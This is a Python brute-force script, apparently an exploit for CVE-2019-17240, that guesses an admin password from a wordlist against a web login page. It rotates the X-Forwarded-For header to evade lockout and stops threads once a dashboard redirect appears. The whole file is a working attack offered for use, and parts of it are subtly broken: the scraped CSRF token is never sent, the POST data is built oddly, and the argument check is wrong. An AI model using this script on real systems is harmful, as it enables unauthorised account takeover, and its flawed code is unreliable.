#!/usr/bin/env python3
import requests
import argparse
import sys
import concurrent.futures
import ctypes
from bs4 import BeautifulSoup


class Bluteforce():

    def __init__(self, url, wordlist, threads):

        self.url = url

        passwds = []
        print(f'[+] Reading {wordlist}')
        with open(wordlist, 'r', encoding='latin-1') as words:
            passwds = [word.strip('\n') for word in words.readlines()]

        print(f'[+] Running with {threads} thread(s):')
        print()
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            worker = executor.map(self.run, passwds)
            for result in worker:            
                if 'location' in result[0].headers:
                    if '/admin/dashboard' in result[0].headers['location']:
                        executor.shutdown(wait=False)
                        for t in executor._threads:
                            self.terminate_thread(t)
                        print(f'[+] Found password as: {result}')                        
                else:
                    print(f'\033[1A\r[+] Progress: {round((passwds.index(result[1])/len(passwds))*100, 2)}%\tTried: {result[1]}                                       ')
        print(f'\033[1A\r[+] Progress: 100%                                                               ')
        print('[+] No combination found :-(')

    def run(self, passwd):
        with requests.session() as bruteSession:
            csrfResp = bruteSession.get(self.url)
            soup = BeautifulSoup(csrfResp.content, features='lxml')
            csrfToken = soup.find('input', dict(name='tokenCSRF'))['value']
            bruteSession.headers.update({'X-Forwarded-For': f'{passwd}', 'Content-Type': 'application/x-www-form-urlencoded'})
            postdata = {f'tokenCSRF={csrfToken}&username=admin&password={passwd}&save='}
            postdata = {'data':f'username=admin&password={passwd}&save='}
            response = requests.post(self.url, data=postdata)
            return response, passwd

    def terminate_thread(self, thread):
        '''
        https://stackoverflow.com/questions/52631315/python-properly-kill-exit-futures-thread
        
        Terminates a python thread from another thread.

        :param thread: a threading.Thread instance
        '''
        if not thread.is_alive():
            return

        exc = ctypes.py_object(SystemExit)
        res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
            ctypes.c_long(thread.ident), exc)
        if res == 0:
            raise ValueError("nonexistent thread id")
        elif res > 1:
            # """if it returns a number greater than one, you're in trouble,
            # and you should call it again with exc=NULL to revert the effect"""
            ctypes.pythonapi.PyThreadState_SetAsyncExc(thread.ident, None)
            raise SystemError("PyThreadState_SetAsyncExc failed")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='Bluteforce - CVE-2019-17240')
    parser.add_argument('url', type=str, help='Url to admin page')
    parser.add_argument('wordlist', type=str, help='Path to wordlist')
    parser.add_argument('-t', type=int, help='Threads (default: 5)')

    if sys.argv == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    threads = args.t if args.t else 5

    bluteforce = Bluteforce(args.url, args.wordlist, threads)